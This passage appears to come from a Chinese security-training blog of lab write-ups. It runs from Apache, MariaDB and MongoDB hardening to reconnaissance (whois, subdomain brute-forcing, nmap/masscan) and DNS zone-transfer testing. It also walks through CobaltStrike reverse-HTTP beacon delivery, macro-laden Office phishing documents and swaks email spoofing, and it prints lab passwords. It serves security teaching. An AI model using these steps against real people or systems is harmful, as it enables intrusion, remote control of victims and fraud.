第二行，表示禁止使用.htaccess文件，覆盖此处配置 第三行，表示禁止访问根目录 二、删除网站的目录浏览权限apache会在默认路径下开启目录浏览 继续查看apache配置文件，如图，其中Indexes即为目录浏览权限，直接删除掉即可。 三、限制HTTP方法apache默认没有限制限制http方法，我们可以在需要的路径下进行限制 如下代码限制了在根目录下，只能使用GET与POST方法（注意，由于apache实现代码的原因，这里HEAD方法与GET方法等同，所以HEAD方法也可以访问） 123&lt;Location &quot;/&quot;&gt; AllowMethods GET POST&lt;/Location&gt; 如图 四、错误页面重定向http的错误页面可能会暴露服务器信息，我们可以将错误页面都重点向到某文件 新建一个错误页面文件，文件内容为error 1echo error &gt; /var/www/html/error.txt 编辑配置文件，指定错误代码400 401 402 403 404 500 指向error 五、限制POST数据大小编辑配置文件 在文件中加下行,注意不要放在路径的申明中 1LimitRequestBody 100 六、记录下post的数据很多攻击行为由post发起，记录post数据可以便于追踪溯源 编辑配置文件 加载记录IO的模块 1LoadModule dumpio_module modules/mod_dumpio.so 指定日志级别，记录IO （位置一定要对，不能随意编辑） 123LogLevel dumpio:trace7DumpIOInput On 七、保存退出，并重启服务退出vim ,使用以下命令重启apache服务 1systemctl restart httpd 八、验证配置前面我们已经完成了apache的加固，下面进行验证，这里我们使用linux自带的curl工具进行验证 1、验证当前的HTTP限制的方法，如我们OPTIONS方法进行测试 如图curl -i -X OPTIONS 127.0.0.1&#x2F;1.txt 2、验证错误页面重定向 1curl 127.0.0.1/test.html 因为服务器上并不存在test.html，所以重定向到了error.txt 3、验证限制post数据大小 curl使用-d选项时，会使用post，前面我们限制post的body为100字节，下面引号中随便输入足够长的数据即可 1curl -d &#x27;testtesttesttestsa 中间输入超过100个字符随便输入jfljaslfjlajflajlfjsfuwefjsljfljsttesttest&#x27; 127.0.0.1 4、验证日志记录post数据使用下面命令向服务器post的数据为11223344 1curl -d &#x27;11223344&#x27; 127.0.0.1 服务器无法处理post请求，直接报错error 查看日志，可以在日志中找到11223344 总结通过实验学会Linux下的apache安全配置，同时学会基本的curl命令应用。 作业我们配置了错误重定向和限制http方法，思考为什么我们使用head方法访问服务器时，服务器提示的403错误为什么没有重定向到error文件中，请将思考结果写在实验报告中 基线管理之MariaDB安全配置实验目的MariaDB的安全配置过程与配置方法，掌握数据库安全配置对安全运维至关重要。 实验环境一台Centos7 已安装MariaDB数据库 实验原理通过配置文件与数据库的配置，实现MariaDB安全配置 实验步骤一、操作系统级权限检查1、检查数据库的运行权限，不建议以root运行数据库，防止越权攻击 1ps -ef | egrep &quot;^mysql.*$&quot; 如图显示mysqld的运行用户为mysql 2、禁用mariadb的历史记录功能 查找缓存文件 1find $HOME -name &quot;.mysql_history&quot; 将缓存文件指向空文件 12rm -f $HOME/.mysql_historyln -s /dev/null $HOME/.mysql_history 3、查看并配置数据库存放路径权限 登录数据库 1mysql -u root 查看数据库存放路径 1show variables where variable_name = &#x27;datadir&#x27;; 退出数据库 1quit 查看数据库存放路径权限 1ls -l /var/lib | grep mysql 如图权限为755，使用以下命令改为700 1chmod 700 /var/lib/mysql 二、Mariadb数据库的通用安全配置1、删除默认的test数据库 进入数据库 1mysql -u root 1show DATABASES LIKE &#x27;test&#x27;; 删除数据库 1DROP DATABASE &#x27;test&#x27;; 2、禁用local_infile参数 查看local_infile参数是否开启 1show variables where variable_name = &#x27;local_infile&#x27;; 如上图显示local_infile 是开启状态，需要修改mariadb配置文件。修改方法，见后文。 3、修改secure_file_priv参数 查看secure_file_priv参数 1SHOW GLOBAL VARIABLES WHERE Variable_name = &#x27;secure_file_priv&#x27; ; 如图显示路径为空，表示所有路径，建议设置为固定值，需要修改mariadb配置文件。修改方法，见后文。 4、确定只有root用户有内置数据库mysql的权限 查看内置数据库的权限 1SELECT user, host FROM mysql.user WHERE (Select_priv = &#x27;Y&#x27;) OR (Insert_priv = &#x27;Y&#x27;) OR (Update_priv = &#x27;Y&#x27;) OR (Delete_priv = &#x27;Y&#x27;) OR (Create_priv = &#x27;Y&#x27;) OR (Drop_priv = &#x27;Y&#x27;); 5、查看file_priv权限，确定只有root用户有 1select user, host from mysql.user where file_priv = &#x27;Y&#x27;; 撤销用户权限 如果在上例检查中，发现非root用户，可以使用下面命令撤销 1revoke file on *.* from &#x27;user&#x27;; 同时这里检查权限还应有process_priv、super_priv这些字段。 6、配置允许用户登录的主机 查看当前用户可以登录的主机 1select user,host from mysql.user; 更新用户允许登录的主机，如 1update mysql.user set host=&quot;192.168.1.200&quot; where host=&quot;localhost&quot; and user=&quot;root&quot;; 7、查看密码安全策略 1show variables like &#x27;validate_password%&#x27;; 三、验证安全配置1、生成两个任意文件 12echo 1111 &gt; /tmp/111.txtecho 2222 &gt; /var/lib/mysql-files/222.txt 2、进入数据库 1mysql -u root 3、导入文件，前面我们查看参数时，发现local_infile参数为on 执行以下操作 创建数据库 12create database temp;use temp; 创建表，并导入&#x2F;tmp&#x2F;111.txt 123create table table_test(cmd text);insert into table_test(cmd) values (load_file(&#x27;/tmp/111.txt&#x27;));select cmd from table_test; 再次导入&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;222.txt 12insert into table_test(cmd) values (load_file(&#x27;/var/lib/mysql/222.txt&#x27;));select cmd from table_test; 发现导入成功 3、配置禁止导入，与导入路径 退出数据库 1quit 编辑数据库配置文件 1vim /etc/my.cnf 加入下面行，指定允许导入的路径，如&#x2F;tmp 1secure_file_priv=/tmp 保存并退出文件 重启mariadb数据库 1systemctl restart mariadb 进入数据库 1mysql -u root -h 127.0.0.1 尝试导入文件 123use temp;insert into table_test(cmd) values (load_file(&#x27;/var/lib/mysql/222.txt&#x27;));select * from table_test; 虽然提示执行成功，但查看数据库时，发现值为NULL 实验总结通过mariadb的配置文件与参数查看，理解mariadb的一些安全配置。 安全基线之MongDB安全配置实验目的理解MongoDB的安全配置选项，掌握Mongodb的安全配置方法 实验环境一台服务器，已经安装好MongDB， 实验原理通过修改配置文件，加强安全配置 实验步骤一、查看MongoDB监听的端口编辑mongdob的配置文件 1vim /etc/mongod.conf 查看配置文件监听的端口与IP，Mongodb默认监听127.0.0.1的27010端口，可以按实际情况进行修改。 二、开启mongodb的验证1、开启验证功能 在配置文件，开启security,并加在security:下面加入下面行 12security: authorization: &quot;enabled&quot; 保存退出文件 2、新建用户 使用下面命令连接mongdb服务器 1mongo 127.0.0.1 输入下面命令 新建用户 12345678use admindb.createUser( &#123; user: &quot;root&quot;, pwd: &quot;sangforpassword&quot;, roles: [ &#123; role: &quot;userAdminAnyDatabase&quot;, : db: &quot;admin&quot; &#125; ] &#125;) 3、退出数据库 输入exit 三、配置mongodb日志查看mongodb配置文件 1vim /etc/mongod.conf 找到auditlog行，发现未配置auditlog 改为下图 保存并退出文件 四、修改相关文件权限1、查看数据库文件路径 1cat /etc/mongod.conf | grep dbPath mongodb的数据库文件为&#x2F;var&#x2F;lib&#x2F;mongo 2、检查上述文件权限，建议设置为770 文件所有者和所属组为mongod 1ls -l /var/lib/ |grep mongo 如图文件夹权限为755 使用下面命令修改为770 1chmod 770 /var/lib/mongo 五、验证配置生效1、因为修改了配置文件，需要重启mongodb服务 1systemctl restart mongod 2、使用客户端连接mongodb 123mongo 127.0.0.1show dbs 提示未验证 使用exit退出当前连接 3、使用账号密码连接mongodb 1mongo 127.0.0.1 -u &quot;root&quot; -p &quot;sangforpassword&quot; --authenticationDatabase &quot;admin&quot; 查看数据库 1show dbs 4、查看日志 1tac /var/log/message | more 可以看到mongodb日志 实验总结通过mongodb的配置，完善了mongdb最弱的验证与日志两个功能。加强了文件权限管理。同时仍然还有一些配置需要加强，具体参照不同应用场景需求。","tags":["Blue","sxf"],"categories":["Experiments"]},{"title":"某厂产业教育 - 信息收集实验","path":"/2024/09/13/红蓝攻防/ⅢR信息收集实验/","content":"DNS信息查询综合实验【目的】 希望学生可以利用相关工具与平台针对一个企业的DNS、IP信息进行收集，同时以此希望学生能够提高对企业网络资产信息保护的意识。 【预计完成时间】 45分钟。 实验环境123操作机：kali 用户名：root 密码：Sangfor!7890 【环境】 设备需求 Linux操作系统的电脑 Windows操作系统的电脑 配置说明 系统能够正常访问互联网 环境测试 使用ping、nslookup、whois等命令，能够对域名做正确的DNS解析 【工具】 whois nslookup dig subDomainsBrute IP反查 【原理】 域名系统（英文：Domain NameSystem，DNS）是因特网的一项服务，它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网。DNS使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。 当个人或者企业实体注册域名时需要注册许多信息，注册隐私的设置各种各样，我们可以搜集这些信息并用来验证IP空间。根据这个线索，可以寻找属于该个人或者企业实体的其他网站信息，甚至于核心员工的号码和地址。 【步骤】1. 利用相关命令进行针对域名的信息收集。123- 确定目标：sangforedu.com.cn、sangfor.com.cn- 本次实验需要对该目标下的域名、IP进行信息收集。 2. 使用 whois 命令对该域名进行查询： whois sangforedu.com.cn 这里我们又发现一个新的域名：sangfor.com.cn，继续利用whois进行查询： 其中比较重要的有邮箱、电话号码、姓名，在后期社会工程学攻击中可能有用。 通过查询出的邮箱，在利用站长之家网站提供的几个域名反查工具进一步查询： 又可发现一些新的域名： gbasic.cn、securelogin.com.cn等等。 利用whois进行相关正向反向查询的介绍就到这里，学生可自行对其他邮箱、电话、联系人姓名进行whois反查，获取更多的信息。 3. 利用nslookup工具进行域名查询(windows中的命令提示符中进行操作，kali终端中使用dig进行查询，详见第4步）。查询A类型记录： 查询MX类型记录： 4. 利用dig工具查询各类DNS的解析。直接查询域名：dig sangfor.com.cn （或者：dig @DNSServerIP domain） 指向负责解析的DNS主机：dig sangfor.com.cn @8.8.8.8 查询NS记录：dig sangfor.com.cn NS 查询TXT记录：dig sangfor.com.cn TXT 5. 使用DNS子域名爆破工具，针对子域名进行爆破，同时解析出对应的IP地址。在github上查找subDomainsBrute工具。 使用git clone命令将工具下载下来,并赋予”subDomainBrute.py”文件执行权限。 该工具的帮助文档及参数说明（注意，使用python3进行执行） 使用该工具。 python3 subDomainsBrute.py --full -t 10 sangfor.com.cn -w 使用-w进行扩展扫描，增大命中概率。 通过子域名的爆破，可以进一步明确企业网络资产（有哪些域名、域名对应什么系统、域名集中的C段地址等等），这是攻击者、防御者都需要时刻关注的方面。 扫描完成后，会在该工具同目录下，生成对应的文本文件，最终获取的子域名结果如下： 6. 利用多地Ping工具，查看域名真实IP。一些站点为了能够让用户获得更好的体验与提高安全性，会采用CDN技术对网站进行加速，因此在使用nslookup等工具进行本地查询时，可能无法获取到网站的真实IP地址。 这种情况下，通常采用多个地点对网站进行访问，查看解析结果的方式来确定是否使用CDN。 在浏览器中输入http://ping.chinaz.com/sangfor.com.cn 7. 针对部分IP进行信息收集通过上述步骤，可以将确定的集中在某一C段IP进行查询，确定是否属于该企业。 选取子域名爆破结果中多次出现的一个IP（C段）： whois 222.126.229.179 查询出该地址所以段的相关信息，地理位置等信息，多个IP地址查询出的信息，进行交叉分析，可能会有较全面的信息内容。 或者在网上采用IP地址反查，可能查出更多信息。 【总结】 本实验主要通过利用各类DNS、IP查询工具，进行网络信息进行收集。 通过本次实验学生应该掌握DNS、IP信息收集的相关知识、工具。 DNS域传输实验实验目的 通过此次实验，希望学生体验dns域传输漏洞原理及危害。 实验环境1234567操作机：kali 用户名：root 密码：Sangfor!7890靶机：Ubuntu20.04 用户名：root 密码：Sangfor!7890 实验原理DNS作为重要的互联网基础设施，难免成为黑客的重点攻击目标，服务的稳定性尤为重要。 DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。 若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。 大的互联网厂商通常将内部网络与外部互联网隔离开，一个重要的手段是使用Private DNS。如果内部DNS泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部网络沦陷。 实验步骤1.开启靶机漏洞环境登录”Vulhub”靶机，并进入漏洞环境路径，开启docker环境。 操作步骤如下图所示： 图中1处，使用用户名和密码登录靶机，用户名root，密码Sangfor!7890 图中2处，进入DNS域传输漏洞环境路径，命令如下 1cd ~/vulhub-master/dns/dns-zone-transfer 图中3处，启动漏洞环境，命令如下 1docker-compose up -d 图中4处，查看容器是否启动成功，命令如下，重点看status这一列。有启动时间即可。表示靶机环境已开启。 1docker ps 2.查看靶机ip地址使用ifconfig命令，查看当前靶机IP地址。关注ens18显示的IP地址 图中查看靶机IP地址为192.168.0.161，该地址将用作攻击机解析域名的指定DNS服务器。 3.漏洞复现测试一 登录攻击机kali，在终端中，使用dig命令，尝试靶机是否存在域传输漏洞。 操作步骤如下图所示： （1）、登录kali主机 （2）开启终端，并测试靶机是否存在域传输漏洞 图中1处，点击终端图标，新建一个终端窗口 图中2处，输入测试命令如下 1dig @192.168.0.161 -t axfr vulhub.org @192.168.0.161 表示指定域名解析服务器，即DNS服务器 -t axfr 表示请求类型（type）为axfr，即表示域传输请求类型 vulhub.org 表示请求的域名 发送域传输请求后，得到了关于vulhub.org域名下所有的域名信息，证明域传输漏洞是存在。 测试二 使用nmap工具对DNS服务器进行扫描测试。 命令 1nmap --script dns-zone-transfer.nse --script-args &quot;dns-zone-transfer.domain=vulhub.org&quot; -Pn -p 53 192.168.0.161 如下图所示： 图中表示，通过nmap扫描脚本，对vulhub.org域名进行域传输测试。 --script dns-zone-transfer.nse 表示使用域传输检测脚本dns-zone-transfer.nse -script-args &quot;dns-zone-transfer.domain=vulhub.org&quot; 配置脚本的参数，即目标域名vulhub.org -Pn表示进行ping测试 -p 53表示指定端口，此处为53号端口 测试结果，与测试一结果相同，即证明域传输漏洞是存在。 实验总结通过手动启动靶机测试环境，并通过两种测试方式，向靶机发送域传输请求，以验证是否存在域传输漏洞。 子域名收集实验实验目的通过本实验中子域名收集的方法和常用工具，完成对指定（授权）域名的子域名信息收集。 实验环境12345操作机：kali用户名：sangfor密码：Sangfor!7890 实验原理通过互联网的公共信息资源，通过相关的方法和工具，实现对指定域名的子域名信息收集，为后续的测试，提供更全面的测试面，提高成功率。 实验步骤一、子域名爆破工具 1、安装爆破工具 登录”Kali”操作机，在终端中输出命令git clone https://github.com/lijiejie/subDomainsBrute，下载子域名爆破工具subDomainsBrute。 图中2处，下载安装工具； 图中3处，下载完毕后，查看当前目录是否新增了该工具的文件夹。 2、增加执行权限 进入工具的文件夹，使用命令chomd +x subDomainsBrute给执行脚本程序赋予执行权限 由上图可见，已成功给脚本文件增加执行权限。 3、使用工具，检测对应的域名存在的子域名 注意：禁止对非授权域名进行探测、爆破，避免触犯国家相关法律规定。 因工具需使用python3中的部分模块（python2中可能不存在），所以在前面指定使用python3执行。 从图中可见，扫描完成后，生成了txt文件，存放扫描结果，本次探测出91个子域名。 通过cat命令，可以查看详细信息。 二、搜索引擎使用搜索引擎指定站点语法site：，搜索子域名。 Google搜索 注：-www表示搜索结果中，去掉包含www字符串的结果。 Bing搜索 Baidu搜索 三、使用theHarvester工具在终端中输入theHarvester,可以看到如下界面。 想要查看关于参数的说明文档，可使用theHarvester --help -d 指定域名 -g 使用google搜索 -s 使用shodan搜索 -b 指定某一种或全部(all)搜索。如果要使用shodan、github等引擎搜索，需要设置对应的API-key，对应的文件是api-keys.yaml，路径为/etc/theHarvester目录下。 使用bing搜索引擎进行搜索，如下图所示： 在图中可见，除了搜索出子域名和IP地址外，还查询到邮箱地址。 使用dns爆破参数-c 搜索结果： 实验总结通过使用subDomainsBrute、搜索引擎相关语法、theHarvester，分别完成对指定域名子域名的信息收集，更为全面的了解被测试目标相关联的域名，为后续测试，提供信息支撑。 子域名收集2实验目的本实验将通过aquatone工具集，实现对目标子域名信息的收集，并实现对主机端口的扫描探测。 实验环境12345操作机：kali用户名：root密码：Sangfor!7890 实验原理aquatone是一个工具集合，通过3个工具的配合，完成目标子域名和相关信息收集。 实验步骤1.登录”Kali”操作机，打开终端，输入命令aquatone-discover --help查看相关参数的帮助文档 从图中可见，主要涉及几个重要参数： 123-d,指定目标域名--nameservers，指定使用的名字服务器-t，指定查询线程数 扩展：aquatone-discover支持扩展查询，比如shodan搜索引擎，扩展查询需要指定其API Key值。 第2步骤中的截图，因为没有指定相关扩展查询的API Key，所以显示Skipped（跳过）。 设置shodan API key，使用shodan搜索更全面的域名信息 设置完成，key会保存在~/aquatone/目录下的.keys.yml文件中，该文件是隐藏的，可以使用命令ls -la查看到该文件，如下图所示。 当没有设定扩展收集器的key时，可以将对应的收集器排除，提高探测效率。对应的参数是--disable-collectors，多个收集器，使用，隔开。 2、使用aquatone-discover命令，对已授权目标域名进行信息探测。 图中，使用参数-d指定了目标域名；使用-t指定1个线程，-s指定每隔2秒发送查询包。 上图是工具查询到的信息回显，扫描完成后，会在目录中生成结果文件夹，名称与目标域名一致。 扫描结束，如下图所示。 图中可见3部分，上方第一部分，为扫描过程中的实时回显，中间部分是按照所属C段解析出了几台主机；最下方显示将结果信息存放到对应路径的文件中（以两种不同的格式，存放了域名和IP的对应关系）。如下图所示。 3、aquatone-scan 扫描减少扫描的目标，仅导出www.sanfor.com.cn域名信息，在sangfor.com.cn文件夹下，按照对应格式，编写两个文件（hosts.txt和hosts.json），主要是json格式的文件，用于接下来的端口扫描。详见下图1处。 扫描命令：aquatone-scan -d sangfor.com.cn -p 22,3389,80,21 -t 1 -s 2，详见图中2处。 1234-d，指定域名，此处域名需与 discover 节点扫描的内容一致-p，指定扫描的端口，使用逗号分隔-t，指定线程数-s，指定发送请求时，间隔2秒 图中可见，探测出80端口是处于开放状态，相关信息已存放在open_ports.txt和urls.txt文件中。 实验总结本实验通过使用aquatone工具集中的discover和scan工具，完成对指定域名的子域名信息收集和端口存活探测。 C段扫描实验目的通过使用常见扫描工具，对C段资产信息扫描和收集。 实验环境1234567891011操作机：kali 用户名：root 密码：Sangfor!7890靶机：Ubuntu 18.04.02 用户名：root 密码：Sangfor!7890 实验原理通过使用Nmap、Masscan工具，对指定目标信息的探测。 实验步骤一、Nmap扫描1、登录靶机，合用ifconfig命令，查看是否获取到IP地址，如果没有获取到192开头的IP地址，参照下图的命令获取IP地址、查看IP地址。 2、登录kali主机，在终端中使用nmap工具探测信息资产（IP地址段，以第1步骤为准）。 命令一：Nmap –sn –PE -n 192.168.0.0/24 –oX out.xml123-sn 不扫描端口-PE ICMP 扫描-n 不进行dns解析 查看保存路径下，已输出指定文件，文件中保存了扫描的结果。 二、Masscan扫描【准备】执行以下命令，完成安装准备。 1231. apt-key adv --refresh-keys --keyserver keyserver.ubuntu.com2. wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add3. apt update 1、安装工具所需依赖环境，命令apt-get install git gcc make libpcap-dev 2、下载工具，并进行编译。命令git clone https://github.com/robertdavidgraham/masscan 3、C段探测。命令masscan –p 80 ip/24 --rate 10000 -oL output.txt 123-p 设置端口--rate 发包速率-oL 输出位置 通过vim工具，查看扫描的完整结果。 从图中可见，当前C段中，80端口开放的主机，共计有13台主机，其中192.168.0.69主机，为我们实验当中的靶机。 实验至此结束。 实验总结通过使用Nmap、Masscan工具，对指定目标信息的探测。 指纹识别实验目的通过使用常见工具，对目标资产的类别和版本进行识别。 实验环境12345操作机：kali 用户名：root 密码：Sangfor!7890 实验原理通过使用Nmap、Wafw00f工具，对指定目标资产的类别和版本进行识别。 实验步骤登录靶机，手动启动本地网卡。使用命令ifup ens18,并使用ifconfig命令查看获取的IP地址。 一、Nmap工具登录kali主机，在终端中使用nmap工具探测资产服务指纹。 命令一：nmap –sS –Pn –O 192.168.0.85 (IP地址需根据目标靶机实际情况，进行修改） 命令二：nmap -sS -sV 192.168.0.85 命令三：nmap -p 80 --script http-waf-fingerprint 192.168.0.85 实验环境中未部署waf，所以无waf相关信息显示，下图为实际环境中测试，探测到waf设备的信息 二、Wafw00f工具1、下载该工具 1git clone https://github.com/EnableSecurity/wafw00f 2、使用工具 命令四：Wafw00f http://192.168.0.85 (IP地址需根据目标靶机实际情况，进行修改，或者输入目标域名） 实验环境中未部署waf，所以无waf相关信息显示，下图为实际环境中测试，探测到waf设备的信息 实验至此结束。 实验总结通过使用Nmap、Wafw00f工具，对指定目标指纹信息识别、收集。 Maltego情报收集实验实验目的通过本实验，熟悉maltego工具对目标信息汇总收集的相关能力。 实验环境12345操作机：kali用户名：root密码：Sangfor!7890 实验原理Maltego是一款非常优秀的信息收集工具。与其他工具相比，不仅功能强大，而且自动化水平非常高，不需要复杂的命令，就能轻松的完成信息收集。 通过maltego工具，实现对授权测试目标信息收集、分析。 实验步骤1.登录”Kali”操作机，点击左侧的maltego图标，工具将会自行启动图形界面（或在终端中，输入“maltego”也可启动）。 2.配置Transform Hub，然后安装需要的功能模块，将鼠标移动到模块上，会自动出现install，点击后将开始自行安装。（在实验过程中，可按需在此处动态添加功能模块，扩大信息查询的能力）。 建议增加该插件，该插件主要用于DNS相关信息查询（软件自带的dns查询可能失效，可用该插件实现dns信息查询）。 3.收集目标信息。本次我们的目标是一个域名，所以按下图中的步骤选择footprint L3。 输入目标域名： 工具会新建一个画板，在正中会出现我们设定目标域名为根节点，右下角显示查询进度，随着进度条，会实时将收集到的信息同根节点进行关联，拓扑会自动生长。 为了增加信息收集的效率，可以在图标上点击鼠标右键，选择对应查询的类别，比如查询DNS信息，使用【DNSDB】插件。 使用过程中，如果弹出以下对话框，可按下图勾选处理。 该工具在查询过程中，会因使用的插件不同，可能会找到同根节点相关的域名信息，可能不属于根节点真正的域名信息，maltego会给出选项目，让使用者进行选择。 探测完成后，会看到以下拓扑结构的画图，相互的层级关系一目了然。 在现有拓扑中的任一节点，进行进一步信息探测。比如在根节点处，想对域名进行DNS查询，只需在图标上点击右键，输入dns，此时和dns相关的tranform工具，将显示出来，使用者可按需选择。当找到对应的关联信息时，会在画板中自动添加。 对指定域名进行子域名探测 此处我们安装了shodan模块，按照提示，输入个人API Key 在下方的进度消息处，可看到通过shodan探测到12个实体 4.手工增加实体节点 工具探测，可能有些信息探测不全面，此时可人工辅助添加已知信息，加入画板中。 比如，增加一个域名，该域名和根节点域名也相关。 在左侧拖拽域名实体，至画板中，双击该图标，修改为我们需要添加的域名信息。 当搜索到新增节点的信息，与原画板中已有信息有关联时，会自动添加线条，指向关联节点，图中向上的蓝色线条指向了根节点sangfor.comm.cn。 5.导出报告 信息探测完毕后，可以将信息进行汇总导出。 下图是导出的报告截图，共计92页，以不同形式展现。 实验总结通过maltego工具，实现对授权测试目标信息收集、分析。 本实验中实现了对域名目标的关联信息探测，手工辅助增加节点，进行信息探测、关联，并完成信息收集结果的报告生成和导出。 CobaltStrike配置使用实验实验目的通过本实验，掌握Cobaltstrike工具的配置和简单使用方法。 实验环境1234567891011121314151617服务器：kali 用户名：root 密码：Sangfor!7890攻击机：Windows 10 用户名：Administrator 密码：Sangfor!7890受害机：Windows 10 用户名：Administrator 密码：Sangfor!7890 实验原理CobaltStrike（以下简称“CS”）工具，是攻击队常用的团队协作工具之一。本实验将由服务器和攻击机，模拟组成攻击队的CS工具环境，完成相关配置，并通过简单的攻击实践，测试协作效果。 实验步骤1.登录”Kali”操作机，在终端中进入CS文件夹，然后使用命令chmod +x teamserver给teamserver文件赋予执行权限，然后查看当前主机的本地IP地址（后面会用到）。 2.启动服务端服务。 启动服务的命令为：./teamserver IP(本机） 团队接入口令 。 如上图所示，本地IP为192.168.0.199，设置团队协作连接的口令为4444（使用时建议采用强口令）。 至此，服务端配置已完成。 3.登录攻击机，在桌面找到CS文件夹中的cobaltStrike.exe文件，双击运行。 在弹出框中，输入服务器IP192.168.0.199，端口默认为55050，不用修改；用户（user）可以随意设置；口令（password）为服务端设置的4444。输入完毕后，点击连接。 登录成功后，会进入操作界面，如下图所示。 4、创建监听端口。点击左上角CobaltStrike菜单中的Listeners. 下方会出现listeners标签，点击Add按钮，在弹出的新建监听器中，输入相关设置参数。如下图所示，图中为该监听器命名为Listenner，选择payload为windows/beacon_http/reverse_http,设定主机为服务器的IP地址，端口为8808。该配置是在服务端会启动一个端口为8808的http服务，用于受害机主动连接服务器。 此时主机会显示监听开始。 服务端也会显示，在端口8808上已开始监听。 5.生成可执行文件，用于在受害机上运行。选择windows Executable选项，如下图所示。 在弹出框中，选择对应的监听器（此处我们只建了一个监听器，会默认已选择）和输出的文件格式，此处我们选择exe文件类型。 将文件保存至本地磁盘中，图中我们选择了桌面的att文件夹，文件名称如下图所示。 6.投递恶意文件。攻击方投递恶意的途径较多，比如诱导受害者在网站上下载，钓鱼邮件等。此处我们模拟一个网站，在受害机上访问并下载该文件。 使用python http服务模块工具，在本地启动一个http服务。如下图所示。 图中，我们将恶意文件的路径设为网站的根目录，网站的对外端口为8899。此时，在受害机上访问该地址，并下载该文件。 受害机执行时，操作系统会提示,此时点击仍要运行。 点击后，界面无任务回显，而此时CS端已显示受害机器已上线。如下图所示。 实验至此结束。 实验总结通过实际操作配置，并结合一次简单完整的操作，理解CS的配置、运行、协作机制。 CobaltStrikeOffice钓鱼实验实验目的通过本实验，了解通过cobaltStrike制作Office钓鱼文件，并实现攻击的过程和原理。 实验环境1234567891011121314151617服务器：kali 用户名：root 密码：Sangfor!7890攻击机：Windows 10 用户名：Administrator 密码：Sangfor!7890受害机：Windows 10 用户名：Administrator 密码：Sangfor!7890 实验原理CobaltStrike（以下简称“CS”）工具，是攻击队常用的团队协作工具之一。 本实验将通过cobaltStrike工具，制作携带宏脚本的office word文档，并在受害机上运行后，成功控制受害机。 实验步骤1.登陆kali服务器，在CS目录下，赋予teamserver文件运行权限（命令：chmod +x teamserver），然后运行CS服务端程序。 如上图所示，团队登陆的密码设为4444。 2、登陆攻击机，找开CS客户端，登陆CS。 3、添加监听端口。 监听端口设置完成后，在下图中，显示监听端口已启动，已处于监听状态。 下图是在服务端显示为监听端口已启动。 4、制作office宏脚本文件 选择attacks中的packages,在展开的菜单中选择MS Office Maco。 选择监听端口。现在只启动了一个监听端口，默认已选中。 点击生成后，弹出宏文件制作步骤说明。 按照步骤说明，打开一个word文档，选择视图中的宏，在下拉菜单中，选择查看宏。 在宏的位置处，选择当前文档（因此时是新建的文档，未保存名称，所以显示为文档1） 然后，输入宏名，点击创建。 在弹出的宏框中，清除原有宏的内容。 然后，点击CS中的Copy Macro(复制宏)，并粘贴至文档的宏框中。 然后，保存为一个启动宏的word文档（此处可以先保存为后缀为docm文档，保存成功后，去掉后缀中的m即可。 实验环境下，我们将制作好的文档，复制到受害机中，实际的攻击场景中，可通过邮件、社工等方式，完成样本投递。 此处，我们可以在当前目录下，使用python自动的模块，启动一个简易的网站服务python -m http.server 8888,该命令意思是在当前路径为网站根目录，启动一个端口为8888的网站服务器。然后受害机上，使用浏览器访问攻击机的IP和端口，下载这个文件。 因office版本和安全设置原因，已禁用宏，在弹出的提示中，我们手动点击启动内容。 而此时，在攻击机中，已发现受害机成功上线。 实验总结通过本实验，学员了解CS工具制作office钓鱼宏文档的过程，并结合CS工具，感知攻击完成的过程。 伪造（钓鱼）邮件实验实验目的通过本实验，实现常见的邮件伪造过程，体验邮件伪造的整个过程。 实验环境12345服务器：kali 用户名：root 密码：Sangfor!7890 实验原理使用邮件发送协议测试工具swaks，发送虚假邮件给目标邮件地址，为了看到实验效果，建议学员收件地址为自己的邮件地址。 本实验主要是让学员体验伪造邮件的发送过程，不包括带有恶意攻击向量的内容。 实验步骤1.登陆kali服务器，打开终端，查看swaks的帮助文档。 1234命令： swaks --help 或者 man swaks 2.使用命令发送虚假邮件命令swaks --to 收件人邮箱地址 --from 虚假发送人邮箱地址 --ehlo xxx --body “这是邮件正文” --header “Subject：邮件主题” 由上图可见，输入发送虚假邮件的命令后，swaks工具会按照smtp相关标准步骤，发送邮件，并回显整个发送过程。由上图可知，该邮件发送成功。 3.检查收件箱，确认是否收件成功 上图可见，收件成功。图中1处，显示为声称的邮件主题，即Subject部分，图中2处为发件人地址（并非真实存在），即--from，图中3处为邮件正文，即--body内容。 4. 以真实的邮件为基准，发送虚假邮件在选定的伪造邮件中，点击显示邮件原文。 在新页面中，查看到原始邮件内容。 在本地另存为mail_content.txt，并去掉其中Received和To行。 建立新文件，命令touch mail_content.txt 使用vim工具，打开文件，将复制的原始文件内容，按i进入vim工具的编辑模式，按shift+i，完成内容粘贴，然后按esc，并将光标移至Received行，按两次d键，删除该行；然后，同样将光标移至To行，按两次d键，最后，按：，输入wq保存文档，并退出。 使用命令发送邮件，命令为swaks --data mail.content.txt --to 发件人邮箱地址 --from 发送人邮箱 由上图可知，邮件发送成功。 邮箱中收件成功，查看邮件原文，可以看到更多邮件细节。 实验总结通过本实验，学员体验到伪造邮件的发送过程，可结合钓鱼思路，构建钓鱼邮件，深入了解钓鱼邮件的危害，提升安全防护意识。 Web目录扫描实验目的通过使用常见Web目录扫描工具，理解Web目录扫描的原理和意义。 该类探测仅限于实验环境或符合国家或所在地区法律允许情况下进行，禁止用于非法途径！ 实验环境1234567891011操作机：kali 用户名：root 密码：Sangfor!7890靶机：DVWA 用户名：root 密码：Sangfor!7890 ##实验拓扑 实验原理在kali主机的终端中，配置并使用Dirb和dirbuster工具，对目标主机DVWAWeb目录进行探测，对比结果，结合http协议原理，理解Web目录扫描的原理。 实验步骤一、Web主机网络可达测试1、进入DVWA主机，使用ifconfig查看网络配置情况是否正常。 1此时，发现IP地址未正常获取，使用`dhclient -v`命令，成功获取IP地址。 2、进入kali主机，打开终端，通过ping命令和wget命令，对Web主机资源进行访问测试。 从图中可见，ping测试前面存在网络不通，在DVWA主机中重新获取了IP地址后，网络可达； 然后，使用wget http://IP（IP地址为DVWA主机IP），http状态码为200，资源请示成功。 